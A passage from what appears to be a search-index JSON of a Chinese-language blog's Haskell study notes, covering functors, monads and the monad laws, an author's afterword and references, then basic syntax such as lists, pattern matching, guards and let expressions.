\\(\\mathbf{Hask}\\) \u8303\u7574\u7684\u5bf9\u8c61\u53d8\u6210\u4e86 \\(\\mathbf{Maybe}\\) \u8303\u7574\u7684\u5bf9\u8c61 fmap \u51fd\u6570\u63a5\u6536\u4e00\u4e2a a -> b \u7c7b\u578b\u7684\u51fd\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a Maybe a -> Maybe b \u7c7b\u578b\u7684\u51fd\u6570\uff0c\u76f8\u5f53\u4e8e\u5c06 \\(\\mathbf{Hask}\\) \u8303\u7574\u4e2d\u7684\u6001\u5c04 \\(f : A\\to B\\) \u6620\u5c04\u6210\u4e86 \\(\\mathbf{Maybe}\\) \u8303\u7574\u4e2d\u7684\u6001\u5c04 \\(\\mathbf{Maybe}(f) : \\mathbf{Maybe}(A)\\to\\mathbf{Maybe}(B)\\) \u6ce8\u610f \u65f6\u523b\u8bb0\u4f4f\u8fd9\u91cc\u7814\u7a76\u7684\u662f \\(\\mathbf{Hask}\\) \u8303\u7574\u548c\u5b83\u7684\u5b50\u8303\u7574\uff0c\u5bf9\u8c61\u662f\u7c7b\u578b\u800c\u4e0d\u662f\u503c\uff0c\u6001\u5c04\u662f\u51fd\u6570\u4e5f\u6307\u7684\u662f\u4ece\u7c7b\u578b\u5230\u7c7b\u578b \u540c\u65f6\uff0cHaskell \u4e2d\u7684 Functor \u4e5f\u6ee1\u8db3\u51fd\u5b50\u516c\u7406\uff1a fmap id = id \u5373 fmap (id :: A -> A) = (id :: f A -> f A) fmap (f . g) = fmap f . fmap g \u5355\u5b50\uff08Monads\uff09 \u00b6 \u4e00\u4e2a\u5355\u5b50\u8bf4\u767d\u4e86\u4e0d\u8fc7\u5c31\u662f\u81ea\u51fd\u5b50\u8303\u7574\u4e0a\u7684\u4e00\u4e2a\u5e7a\u534a\u7fa4\u800c\u5df2 _(:\u0437\u300d\u2220)_ \u81ea\u51fd\u5b50\u5728\u524d\u9762\u8bf4\u5230\u8fc7\u662f\u4ece\u4e00\u4e2a\u8303\u7574\u5230\u81ea\u8eab\u7684\u4e00\u4e2a\u51fd\u5b50\uff0c\u5982\u8303\u7574 \\(\\mathbf{C}\\) \u4e0a\u7684\u81ea\u51fd\u5b50\u662f \\(F : \\mathbf{C}\\to\\mathbf{C}\\) \u3002\u81ea\u51fd\u5b50\u8303\u7574\u5c31\u662f\u5bf9\u8c61\u90fd\u662f\u81ea\u51fd\u5b50\u7684\u8303\u7574\u3002\u5e7a\u534a\u7fa4\u548c Haskell \u4e2d\u5b66\u5230\u7684 Monoid \u7c7b\u578b\u7c7b\u4e00\u6837\uff0c\u662f\u4e00\u4e2a\u6709\u53ef\u7ed3\u5408\u4e8c\u5143\u8fd0\u7b97\u548c\u5355\u4f4d\u5143\u7684\u4ee3\u6570\u7ed3\u6784\u3002\u56e0\u6b64\u5355\u5b50\u5c31\u662f\u4e00\u4e2a\u81ea\u51fd\u5b50\uff0c\u800c\u4e14\u5b83\u6709\u53ef\u7ed3\u5408\u4e8c\u5143\u8fd0\u7b97\uff08Haskell \u4e2d >=> \uff09\u548c\u5355\u4f4d\u5143\uff08Haskell \u4e2d return \uff09\u3002 \u4e00\u4e2a\u5355\u5b50 \\(M : \\mathbf{C}\\to\\mathbf{C}\\) \u8fd8\u5305\u542b\u4e24\u4e2a\u6001\u5c04\uff08\u5bf9\u4e8e\u8303\u7574 \\(\\mathbf{C}\\) \u4e2d\u7684\u6240\u6709\u5bf9\u8c61 \\(X\\) \uff09\uff1a \\(\\mathrm{unit}_X^M : X\\to M(X)\\) \\(\\mathrm{join}_X^M : M(M(X))\\to M(X)\\) \uff08\u5f53\u5f0f\u5b50\u4e2d\u7684\u5355\u5b50\u660e\u663e\u662f \\(M\\) \u65f6\uff0c\u53ef\u4ee5\u7701\u7565\u4e0a\u6807 \\({}^M\\) \uff09 Haskell \u4e2d Monad \u7684\u5b9a\u4e49\u662f\uff1a class Functor m => Monad m where return :: a -> m a ( >>= ) :: m a -> ( a -> m b ) -> m b \u5176\u4e2d\u5f88\u663e\u7136\u591a\u6001\u51fd\u6570 return \u5bf9\u5e94\u4e86\u5b9a\u4e49\u4e2d\u7684 \\(\\mathrm{unit}\\) \uff0c\u4f46\u662f >>= \u548c \\(\\mathrm{join}\\) \u7684\u5bf9\u5e94\u5173\u7cfb\u5e76\u4e0d\u660e\u663e\u3002\u56e0\u6b64 Haskell \u4e2d\u6709\u4e00\u4e2a\u5de5\u5177\u51fd\u6570 join \uff0c\u5b83\u7684\u6548\u679c\u5c31\u662f\u5b9a\u4e49\u4e2d\u7684 \\(\\mathrm{join}\\) \uff0c\u800c\u4e14\u5b83\u53ef\u4ee5\u548c >>= \u4e92\u76f8\u5b9a\u4e49\uff1a join :: Monad m => m ( m a ) -> m a join x = x >>= id ( >>= ) :: m a -> ( a -> m b ) -> m b x >>= f = join $ fmap f x \u6240\u4ee5 Haskell \u4e2d\u4e3a Monad \u8981\u6c42\u5b9a\u4e49 >>= \u5c31\u76f8\u5f53\u4e8e\u5b9a\u4e49\u4e86 \\(\\mathrm{join}\\) \u4f8b\u5982\uff0c\u5e42\u96c6\u51fd\u5b50 \\(P : \\mathbf{Set}\\to\\mathbf{Set}\\) \u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u53ef\u4ee5\u4e3a\u5b83\u5b9a\u4e49 \\(\\mathrm{unit}\\) \u548c \\(\\mathrm{join}\\) \u4e24\u4e2a\u6001\u5c04\u3002Haskell \u4e2d\u7684\u5217\u8868\u4e5f\u53ef\u4ee5\u8fd1\u4f3c\u770b\u4f5c\u5e42\u96c6\u51fd\u5b50\u3002 \u6001\u5c04/\u51fd\u6570\u7684\u7c7b\u578b \u5e42\u96c6\u51fd\u5b50 Haskell \u4e2d\u5217\u8868 \u4e00\u4e2a\u96c6\u5408 \\(S\\) \u548c\u4e00\u4e2a\u6001\u5c04 \\(f : A\\to B\\) \u4e00\u4e2a\u7c7b\u578b T \u548c\u4e00\u4e2a\u51fd\u6570 f :: A -> B \\(P(f) : \\mathcal{P}(A)\\to\\mathcal{P}(B)\\) fmap f :: [A] -> [B] \\(\\mathrm{unit}_S : S\\to\\mathcal{P}(S)\\) return :: T -> [T] \\(\\mathrm{join}_S : \\mathcal{P}(\\mathcal{P}(S))\\to\\mathcal{P}(S)\\) join :: [[T]] -> [T] \u6001\u5c04/\u51fd\u6570\u7684\u5b9a\u4e49 \u5e42\u96c6\u51fd\u5b50 Haskell \u4e2d\u5217\u8868 \\((\\mathcal{P}(f))(S) = \\\\{f(a):a\\in S\\\\}\\) fmap f xs = [ f a | a <- xs ] \\(\\mathrm{unit}_S(x) = \\\\{x\\\\}\\) return x = [x] \\(\\mathrm{join}_S(L) = \\bigcup L\\) join xs = concat xs \u5355\u5b50\u516c\u7406 \u00b6 \u7ed9\u5b9a\u4e00\u4e2a\u5355\u5b50 \\(M : \\mathbf{C}\\to\\mathbf{C}\\) \uff0c\u548c\u4e00\u4e2a\u6001\u5c04 \\(f : A\\to B\\) \uff08\u5176\u4e2d \\(A,B\\in \\mathbf{C}\\) \uff09\uff0c\u90a3\u4e48\u6ee1\u8db3\u4e0b\u9762\u56db\u6761\u5b9a\u5f8b\uff1a \\(\\mathrm{join}\\circ M(\\mathrm{join})=\\mathrm{join}\\circ\\mathrm{join}\\) \\(\\mathrm{join}\\circ M(\\mathrm{unit})=\\mathrm{join}\\circ\\mathrm{unit}=\\mathrm{id}\\) \\(\\mathrm{unit}\\circ f = M(f)\\circ\\mathrm{unit}\\) \\(\\mathrm{join}\\circ M(M(f)) = M(f)\\circ\\mathrm{join}\\) \u4e5f\u53ef\u4ee5\u5f88\u81ea\u7136\u5730\u5c06\u5176\u8f6c\u5316\u4e3a Haskell \u4e2d\u7684\u8868\u8ff0\uff1a join . fmap join = join . join join . fmap return = join . return = id return . f = fmap f . return join . fmap (fmap f) = fmap f . join \u5728 Haskell \u4e2d\uff0c\u4f7f\u7528 >>= \u4e5f\u6709\u4e09\u4e2a\u5b9a\u5f8b\u548c\u8fd9\u56db\u4e2a\u5b9a\u5f8b\u662f\u7b49\u4ef7\u7684\uff1a return x >>= f = f x return x >>= f = join ( fmap f ( return x )) = join ( fmap f . return $ x ) = join ( return ( f x )) = join ( return . f $ x ) = join . return $ ( f x ) = id ( f x ) = f x m >>= return = m m >>= return = join ( fmap return m ) = join . fmap return $ m = id m = m (m >>= f) >>= g = m >>= (\\x -> f x >>= g) ( m >>= f ) >>= g = ( join ( fmap f m )) >>= g = join ( fmap g ( join ( fmap f m ))) = join . fmap g . join $ fmap f m = join . join . fmap ( fmap g ) $ fmap f m = join . join . fmap ( fmap g ) . fmap f $ m = join . join . fmap ( fmap g . f ) $ m = join . fmap join . fmap ( fmap g . f ) $ m = join . fmap ( join . ( fmap g . f )) $ m = join . fmap ( \\ x -> join ( fmap g ( f x ))) $ m = join . fmap ( \\ x -> f x >>= g ) $ m = join ( fmap ( \\ x -> f x >>= g ) m ) = m >>= ( \\ x -> f x >>= g ) \u6709\u5173 do \u8bed\u53e5\u548c >=> \u7684\u516c\u7406\u8868\u8ff0\u5728\u4e0a\u6587\u4e2d\u5df2\u7ecf\u8bf4\u8fc7 \u540e\u8bb0 \u00b6 \u5543\u4e86\u5c06\u8fd1\u4e00\u4e2a\u6708\uff0c\u7b97\u662f\u628a Haskell \u7684\u4e3b\u8981\u5185\u5bb9\u90fd\u5543\u5b8c\u4e86\u3002\u4e3b\u8981\u5c31\u662f\u524d\u671f\u770b Learn You a Haskell \uff0c\u540e\u671f\u770b Typeclassopedia \uff0c\u90fd\u662f pdcxs \u63a8\u8350\u7ed9\u7684\u6559\u7a0b\u3002\u4f46\u662f\u4e00\u5806\u89c6\u9891\u4e00\u4e2a\u90fd\u6ca1\u6709\u8010\u5fc3\u770b\u8fdb\u53bbqwq \u540e\u9762\u7684\u90e8\u5206\u7684\u7406\u89e3\u611f\u89c9\u4e5f\u6ca1\u5230\u4f4d\uff0cCategory\u3001Arrow \u7b49\u8fd9\u4e9b\u7c7b\u578b\u7c7b\u4e5f\u5c31\u662f\u5927\u81f4\u5730\u770b\u4e86\u4e00\u773c\uff0c\u751a\u81f3\u6709\u4ec0\u4e48\u7528\u90fd\u4e0d\u592a\u6e05\u695a_(:\u0437\u300d\u2220)_ \u611f\u89c9 Haskell \u8fd9\u95e8\u8bed\u8a00\u786e\u5b9e\u5f88\u795e\u5947\uff0c\u5f88\u591a\u8bed\u6cd5\u90fd\u5f88\u6709\u610f\u601d\uff0c\u800c\u4e14\u53ef\u4ee5\u505a\u5230\u975e\u5e38\u8d34\u8fd1\u6570\u5b66\u3001\u8d34\u8fd1\u6570\u5b66\u6982\u5ff5\u3002\u5b66\u7684\u65f6\u5019\u4e5f\u662f\u8d8a\u5b66\u5751\u8d8a\u591a\uff0c\u5148\u662f\u51fd\u6570\u5f0f\u7f16\u7a0b\u5f15\u7533\u5230\u4e86 lambda \u6f14\u7b97\uff0c\u7136\u540e\u662f\u51fd\u5b50\u7b49\u4e00\u7cfb\u5217\u6982\u5ff5\u5f15\u7533\u5230\u4e86\u8303\u7574\u8bba\uff0c\u76ee\u524d\u8303\u7574\u8bba\u7b80\u5355\u5730\u770b\u4e86\u4e00\u90e8\u5206\uff0clambda \u6f14\u7b97\u4e5f\u6ca1\u6df1\u5165\u7814\u7a76\uff0c\u4ee5\u540e\u6709\u65f6\u95f4\u518d\u8bf4\u4e86\uff08\u5495\u5495\u5495\uff09 \u73b0\u5728\u611f\u89c9\u6211\u5b66\u5230\u7684 Haskell \u7b80\u76f4\u662f\u76ae\u6bdb\uff0c\u8fd8\u6709\u4e00\u5806\u6e90\u7801\u91cc\u7684\u4e1c\u897f\u4e0d\u77e5\u9053\u662f\u600e\u4e48\u56de\u4e8b\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e#\uff0c~\uff09\uff0c\u4e5f\u8fd8\u6709\u4e00\u5806\u7c7b\u578b\u7c7b\u548c\u7528\u6cd5\u6ca1\u6709\u5b66\u5230\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e Monad Transformer\u3001Writer\u3001Reader\u3001State\u3001Comonad\u3001MonadFix\u3001Lens\u3001Parsec\u3001\u2026\u2026\uff09 md\uff0c\u8fd9\u4e48\u4e00\u770b\u5dee\u7684\u8fd8\u771f\u591a \uff0c\u4ee5\u540e\u6709\u65f6\u95f4\u518d\u6162\u6162\u5b66\u4e86\uff0c\u8fd9\u4e2a\u5047\u671f\u8fd8\u6709\u597d\u591a\u5176\u5b83\u4e8b\u8981\u5e72\u5462\uff0cHaskell \u8fd9\u8fb9\u5148\u6478\u4e86_(:\u0437\u300d\u2220)_ Reference \u00b6 Learn You a Haskell Writing foldl using foldr - StackOverflow Haskell\uff1a\u7528foldr\u5b9a\u4e49foldl Typeclassopedia - Haskell wiki Hoogle Functors, Applicatives, And Monads In Pictures Haskell\u5b66\u4e60 - functor Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff088\uff09Monoid - zwvista Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff0816\uff09Alternative - zwvista Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff0840\uff09Arrow\uff081\uff09 - zwvista 24 Days of GHC Extensions: Arrows - Tom Ellis Haskell\u8bed\u8a00\u5b66\u4e60\u7b14\u8bb0\uff0847\uff09Arrow\uff082\uff09 - zwvista Haskell/Category theory - wikibooks Category theory - wikipedia \u8303\u7574\u8bba - \u7ef4\u57fa\u767e\u79d1 Monad (category theory) - wikipedia Functor - wikipedia \"The End?\"","title":"Haskell"},{"location":"cs/pl/haskell/#_1","text":"+ - * / () \uff1a\u52a0\u51cf\u4e58\u9664 div \uff1a\u6574\u9664 mod \uff1a\u53d6\u6a21 True False \uff1a\u5e03\u5c14\u503c || && not \uff1a\u6216\u4e14\u975e == \uff1a\u6761\u4ef6\u5224\u65ad\uff0c\u76f8\u7b49 /= \uff1a\u6761\u4ef6\u5224\u65ad\uff0c\u4e0d\u7b49","title":"\u57fa\u7840\u8fd0\u7b97"},{"location":"cs/pl/haskell/#_2","text":"Haskell \u4e2d\u8c03\u7528\u51fd\u6570\u4e0d\u52a0\u62ec\u53f7\uff0c\u5148\u5199\u51fa\u51fd\u6570\u540d\uff0c\u7136\u540e\u9010\u4e2a\u5217\u51fa\u53c2\u6570\uff0c\u7528\u7a7a\u683c\u9694\u5f00\uff1a ghci > max 1 2 2 \u524d\u7f00\uff08prefix\uff09\u51fd\u6570\u4e0e\u4e2d\u7f00\uff08infix\uff09\u51fd\u6570\u8f6c\u6362\uff1a \u5bf9\u524d\u7f00\u51fd\u6570\u52a0 `` \u4f7f\u5176\u53d8\u6210\u4e2d\u7f00\u51fd\u6570 \u5bf9\u4e2d\u7f00\u51fd\u6570\u52a0 () \u4f7f\u5176\u53d8\u6210\u524d\u7f00\u51fd\u6570 ghci > 4 ` div ` 2 2 ghci > 1 ` max ` 2 2 ghci > ( + ) 1 2 3 ghci > ( || ) True False True","title":"\u51fd\u6570\u8c03\u7528"},{"location":"cs/pl/haskell/#list","text":"\u5217\u8868\u662f Haskell \u4e2d\u5f88\u5e38\u89c1\u7684\u6570\u636e\u7c7b\u578b\uff0c\u548c Python \u4e2d\u4e0d\u540c\uff0cHaskell \u4e2d\u7684\u5217\u8868\u4e2d\u7684\u6240\u6709\u5143\u7d20\u5fc5\u987b\u662f\u540c\u4e00\u4e2a\u7c7b\u578b\u3002 \u4ee5\u4e0b\u662f\u5217\u8868\u5e38\u7528\u7684\u51fd\u6570\uff1a (++) :: [a] -> [a] -> [a]\uff1a\u5408\u5e76\u4e24\u4e2a\u5217\u8868 (:) :: a -> [a] -> [a]\uff1a\u5c06\u5355\u4e2a\u5143\u7d20\u5e76\u5165\u5217\u8868\u3002[1, 2, 3] \u662f 1:2:3:[] \u7684\u8bed\u6cd5\u7cd6 (!!) :: [a] -> Int -> a\uff1a\u901a\u8fc7\u7d22\u5f15\u53d6\u51fa\u67d0\u4e2a\u4f4d\u7f6e\u4e0a\u7684\u5143\u7d20\u3002a !! 1 \u76f8\u5f53\u4e8e Python \u4e2d\u7684 a[1] head :: [a] -> a\uff1a\u8fd4\u56de\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 tail :: [a] -> [a]\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u9664\u53bb\u7b2c\u4e00\u4e2a\u5143\u7d20\u540e\u7684\u5217\u8868\uff08\u82e5\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\u5219\u8fd4\u56de\u7a7a\u5217\u8868[]\uff09 last :: [a] -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20 init :: [a] -> [a]\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u9664\u53bb\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u540e\u7684\u5217\u8868 length :: Foldable t => t a -> Int\uff1a\u8fd4\u56de\u5217\u8868\u7684\u957f\u5ea6 null :: Foldable t => t a -> Bool\uff1a\u8fd4\u56de\u5217\u8868\u662f\u5426\u4e3a\u7a7a reverse :: [a] -> [a]\uff1a\u8fd4\u56de\u7ffb\u8f6c\u540e\u7684\u5217\u8868 take :: Int -> [a] -> [a]\uff1a\u8fd4\u56de\u5217\u8868a\u7684\u524dn\u4e2a\u5143\u7d20\u7684\u5217\u8868(take n a) drop :: Int -> [a] -> [a]\uff1a\u8fd4\u56de\u5217\u8868a\u4e2d\u9664\u53bb\u524dn\u4e2a\u5143\u7d20\u540e\u7684\u5217\u8868(drop n a) maximum :: (Foldable t, Ord a) => t a -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u5927\u503c minimum :: (Foldable t, Ord a) => t a -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u7684\u6700\u5c0f\u503c sum :: (Foldable t, Num a) => t a -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u6240\u6709\u5143\u7d20\u7684\u548c product :: (Foldable t, Num a) => t a -> a\uff1a\u8fd4\u56de\u5217\u8868\u4e2d\u6240\u6709\u5143\u7d20\u7684\u79ef elem :: (Foldable t, Eq a) => t a -> Bool\uff1a\u5224\u65ad\u503cn\u662f\u5426\u5728\u5217\u8868a\u4e2d elem n a -- \u6216 n ` elem ` a --\u7528``\u5305\u4e0a\u53ef\u4ee5\u53d8\u6210\u4e2d\u7f00\u51fd\u6570\u4f7f\u7528","title":"List"},{"location":"cs/pl/haskell/#texas-ranges","text":"\u4f7f\u7528 .. \u53ef\u4ee5\u8868\u793a\u51fa\u8303\u56f4\u5e76\u81ea\u52a8\u63a8\u5bfc\uff1a ghci > [ 1 .. 10 ] [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 ] ghci > [ 'a' .. 'z' ] \"abcdefghijklmnopqrstuvwxyz\" ghci > [ 'K' .. 'Z' ] \"KLMNOPQRSTUVWXYZ\" ghci > [ 2 , 4 .. 20 ] [ 2 , 4 , 6 , 8 , 10 , 12 , 14 , 16 , 18 , 20 ] ghci > [ 3 , 6 .. 20 ] [ 3 , 6 , 9 , 12 , 15 , 18 ] ghci > [ 5 , 4 .. 1 ] [ 5 , 4 , 3 , 2 , 1 ] \u4e5f\u53ef\u4ee5\u7528\u6765\u751f\u6210\u65e0\u7a77\u5217\u8868\uff0c\u5982 [1..]\u3001[1, 3..]\u3002\u540c\u65f6\u4e5f\u6709\u51fd\u6570\u53ef\u4ee5\u751f\u6210\u65e0\u7a77\u5217\u8868\uff1a cycle :: [a] -> [a]\uff1a\u5c06\u539f\u5217\u8868\u4e0d\u65ad\u5faa\u73af\u751f\u6210\u65e0\u7a77\u5217\u8868 repeat :: a -> [a]\uff1a\u5c06\u4f20\u5165\u7684\u503c\u4e0d\u65ad\u91cd\u590d\u751f\u6210\u65e0\u7a77\u5217\u8868 replicate :: Int -> a -> [a]\uff1a\u5c06\u503ca\u91cd\u590dn\u6b21\uff0c\u8fd4\u56de\u751f\u6210\u7684\u5217\u8868(replicate n a)","title":"Texas ranges"},{"location":"cs/pl/haskell/#list-comprehension","text":"Haskell \u4e2d\u4e5f\u6709\u5217\u8868\u63a8\u5bfc\uff0c\u5f62\u5f0f\u662f\u4e00\u4e2a\u4e2d\u62ec\u53f7\uff0c\u5de6\u4fa7\u4e3a\u8868\u8fbe\u5f0f\uff0c\u53f3\u4fa7\u4e3a\u53d8\u91cf\u7684\u8303\u56f4\u548c\u7ea6\u675f\u6761\u4ef6 ghci > [ x * 2 | x <- [ 1 .. 10 ]] [ 2 , 4 , 6 , 8 , 10 , 12 , 14 , 16 , 18 , 20 ] ghci > [ x * 2 | x <- [ 1 .. 10 ], x * 2 >= 12 ] [ 12 , 14 , 16 , 18 , 20 ] ghci > [ x | x <- [ 50 .. 100 ], x ` mod ` 7 == 3 ] [ 52 , 59 , 66 , 73 , 80 , 87 , 94 ] ghci > [ x * y | x <- [ 2 , 5 , 10 ], y <- [ 8 , 10 , 11 ]] [ 16 , 20 , 22 , 40 , 50 , 55 , 80 , 100 , 110 ]","title":"List comprehension"},{"location":"cs/pl/haskell/#tuple","text":"Haskell\u4e2d\u7684\u5143\u7ec4\u53ef\u4ee5\u6709\u4e0d\u540c\u957f\u5ea6\uff0c\u5143\u7d20\u53ef\u4ee5\u6709\u4e0d\u540c\u7c7b\u578b\u3002\u5e76\u4e14\u4e00\u4e2a\u5143\u7ec4\u7684\u7c7b\u578b\u7531\u5176\u4e2d\u6240\u6709\u5143\u7d20\u7684\u7c7b\u578b\u5171\u540c\u51b3\u5b9a\u3002\u5b83\u7684\u5e38\u7528\u51fd\u6570\uff1a fst :: (a, b) -> a\uff1a\u8fd4\u56de\u542b\u6709\u4e24\u4e2a\u5143\u7d20\u5143\u7ec4\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 snd :: (a, b) -> b\uff1a\u8fd4\u56de\u542b\u6709\u4e24\u4e2a\u5143\u7d20\u5143\u7ec4\u4e2d\u7684\u7b2c\u4e8c\u4e2a\u5143\u7d20 zip :: [a] -> [b] -> [(a, b)]\uff1a\u63a5\u6536\u4e24\u4e2a\u5217\u8868\uff0c\u8fd4\u56de\u4e00\u4e2a\u5217\u8868\uff0c\u6bcf\u4e2a\u5143\u7d20\u662f\u4f9d\u6b21\u5c06\u4e24\u4e2a\u5217\u8868\u4e2d\u5143\u7d20\u914d\u5bf9\u6210\u7684\u4e8c\u5143\u7ec4","title":"Tuple"},{"location":"cs/pl/haskell/#syntax-in-functions","text":"\u51fd\u6570\u53ef\u4ee5\u76f4\u63a5\u5b9a\u4e49\uff1a plus x y = x + y \u8fd9\u65f6Haskell\u4f1a\u81ea\u52a8\u63a8\u65ad\u51fd\u6570\u7684\u7c7b\u578b\u4e3a(Num a) => a -> a -> a\u3002\u4f46\u662f\u6700\u597d\u5728\u5b9a\u4e49\u51fd\u6570\u524d\u58f0\u660e\u51fd\u6570\u7684\u7c7b\u578b\uff1a plus :: ( Num a ) => a -> a -> a plus x y = x + y","title":"Syntax in Functions"},{"location":"cs/pl/haskell/#pattern-matching","text":"\u5b9a\u4e49\u51fd\u6570\u65f6\u53ef\u4ee5\u4f7f\u7528\u6a21\u5f0f\u5339\u914d\u8bed\u6cd5\u3002\u8fd0\u884c\u65f6\u4f9d\u6b21\u5c06\u8f93\u5165\u4e0e\u7ed9\u51fa\u7684\u6a21\u5f0f\u76f8\u5339\u914d\uff0c\u5982\u679c\u5339\u914d\uff0c\u5c31\u6267\u884c\u5bf9\u5e94\u64cd\u4f5c\uff1b\u4e0d\u5339\u914d\uff0c\u5c31\u7ee7\u7eed\u4e0e\u4e0b\u4e00\u4e2a\u6a21\u5f0f\u76f8\u5339\u914d\uff0c\u76f4\u5230\u5339\u914d\u6210\u529f\uff0c\u4e5f\u56e0\u6b64\uff0c\u6700\u540e\u5fc5\u987b\u8981\u7ed9\u51fa\u4e00\u79cd\u901a\u7528\u7684\u5339\u914d\u6765\u63a5\u6536\u4e0e\u7ed9\u51fa\u6a21\u5f0f\u5168\u4e0d\u5339\u914d\u7684\u8f93\u5165\u3002\u5982\uff1a factorial :: ( Integral a ) => a -> a factorial 0 = 1 factorial n = n * factorial ( n - 1 ) first :: ( a , b , c ) -> a first ( x , _ , _ ) = x second :: ( a , b , c ) -> b second ( _ , y , _ ) = y third :: ( a , b , c ) -> c third ( _ , _ , z ) = z \u5176\u4e2d _ \u8868\u793a\u4efb\u4f55\u503c\uff0c\u4e14\u4e0d\u5173\u5fc3\u5b83\u7684\u5185\u5bb9\uff0c\u53ea\u662f\u7528\u6765\u5360\u4f4d \u5217\u8868\u7684 (:) \u64cd\u4f5c\u4e5f\u53ef\u4ee5\u7528\u6765\u8fdb\u884c\u6a21\u5f0f\u5339\u914d\uff1a head' :: [ a ] -> a head' [] = error \"Can't call head on an empty list, dummy!\" head' ( x : _ ) = x sum' :: ( Num a ) => [ a ] -> a sum' [] = 0 sum' ( x : xs ) = x + sum' xs \u4f46 (++) \u64cd\u4f5c\u4e0d\u53ef\u4ee5\u7528\u6765\u6a21\u5f0f\u5339\u914d \u5728\u9488\u5bf9\u5217\u8868\u8fdb\u884c\u6a21\u5f0f\u5339\u914d\u65f6\uff0c\u5982\u679c\u540c\u65f6\u9700\u8981\u6574\u4e2a\u5217\u8868\u3001\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u503c\u3001\u5217\u8868\u9664\u7b2c\u4e00\u4e2a\u503c\u5916\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 xs@(q:qs) \u3002\u6bd4\u5982 [1, 2, 3] \u901a\u8fc7 xs@(q:qs) \u5339\u914d\u540e\uff0cxs \u4e3a [1, 2, 3]\uff0cq \u4e3a 1\uff0cqs \u4e3a [2, 3]","title":"Pattern matching"},{"location":"cs/pl/haskell/#guard-syntax","text":"\u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5b88\u536b\uff08guard\uff09\u8bed\u6cd5\uff1a max' :: ( Ord a ) => a -> a -> a max' a b | a > b = a | otherwise = b \u5148\u7ed9\u51fa\u4f20\u5165\u7684\u53c2\u6570\u53d8\u91cf\uff0c\u7136\u540e\u4e0b\u4e00\u884c\u7f29\u8fdb\u540e\u52a0 |\uff0c| \u540e\u9762\u7b49\u53f7\u524d\u8868\u793a\u8fdb\u884c\u7684\u5224\u65ad\uff0c\u5982\u679c\u4e3a True \u5219\u8fd4\u56de\u8fd9\u4e2a\u7b49\u53f7\u540e\u9762\u7684\u503c\uff1b\u5982\u679c\u4e3a False \u5219\u7ee7\u7eed\u5224\u65ad\u4e0b\u4e00\u884c\uff0c\u76f4\u5230 otherwise","title":"Guard syntax"},{"location":"cs/pl/haskell/#case-expressions","text":"\u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 case \u8868\u8fbe\u5f0f\u6765\u914d\u5408\u6a21\u5f0f\u5339\u914d\u4f7f\u7528\uff1a case expression of pattern -> result pattern -> result ... \u4f8b\u5982\uff1a head' :: [ a ] -> a head' [] = error \"No head for empty lists!\" head' ( x : _ ) = x -- \u7b49\u4ef7\u4e8e\uff1a head' :: [ a ] -> a head' xs = case xs of [] -> error \"No head for empty lists!\" ( x : _ ) -> x describeList :: [ a ] -> String describeList xs = \"The list is \" ++ case xs of [] -> \"empty.\" [ x ] -> \"a singleton list.\" xs -> \"a longer list.\" -- \u7b49\u4ef7\u4e8e\uff1a describeList :: [ a ] -> String describeList xs = \"The list is \" ++ what xs where what [] = \"empty.\" what [ x ] = \"a singleton list.\" what xs = \"a longer list.\"","title":"Case expressions"},{"location":"cs/pl/haskell/#where","text":"\u58f0\u660e\u5728\u51fd\u6570\u5b9a\u4e49\u4e2d\u8981\u4f7f\u7528\u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u53ef\u4ee5\u4f7f\u7528 where \u5173\u952e\u5b57\uff1a initials :: String -> String -> String initials firstname lastname = [ f ] ++ \". \" ++ [ l ] ++ \".\" where ( f : _ ) = firstname ( l : _ ) = lastname \u5728 where \u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e0a\u9762\u7684\u6a21\u5f0f\u5339\u914d","title":"where"},{"location":"cs/pl/haskell/#let","text":"let <bindings> in <expression> \u8bed\u6cd5\u53ef\u4ee5\u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u5728\u666e\u901a\u7b97\u5f0f\u6216\u5217\u8868\u4e2d\u4f7f\u7528\uff1a cylinder :: ( RealFloat a ) => a -> a -> a cylinder r h = let sideArea = 2 * pi * r * h topArea = pi * r ^ 2 in sideArea + 2 * topArea ghci > 4 * ( let a = 9 in a + 1 ) + 2 42 ghci > [ let square x = x * x in ( square 5 , square 3 , square 2 )] [( 25 , 9 , 4 )]","title":"let"},{"location":"cs/pl/haskell/#if-statement","text":"Haskell \u4e2d\u7684 if \u8bed\u53e5\u4e3a\uff1a if ... then ... else ... -- or if ... then ... else ... -- or if ... then ... else if ... then ... else ... \u5176\u4e2d\u6700\u540e\u4e00\u4e2a else \u65e0\u8bba\u5982\u4f55\u4e5f\u4e0d\u53ef\u4ee5\u7701\u53bb","title":"if statement"},{"location":"cs/pl/haskell/#higher-order-functions","text":"","title":"Higher Order Functions"},{"location":"cs/pl/haskell/#currying","text":"Haskell 